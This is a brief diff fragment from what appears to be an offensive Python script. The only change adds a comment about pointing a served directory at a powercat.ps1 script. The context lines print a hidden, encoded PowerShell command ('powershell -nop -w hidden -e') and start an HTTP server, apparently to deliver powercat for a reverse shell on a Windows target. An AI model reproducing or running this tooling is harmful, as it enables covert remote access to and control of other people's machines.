@@ -30,7 +30,7 @@ print(f'powershell -nop -w hidden -e {encoded_payload}')
 print()
 
 print(f'[+] Running HTTP Server Port {SERVER_PORT}')
-os.chdir('/home/pineapplelogic/Documents/Scripts/Windows/')
+os.chdir('/home/pineapplelogic/Documents/Scripts/Windows/') # Change directory to your prefered powercat.ps1 script
 
 Handler = http.server.SimpleHTTPRequestHandler
 
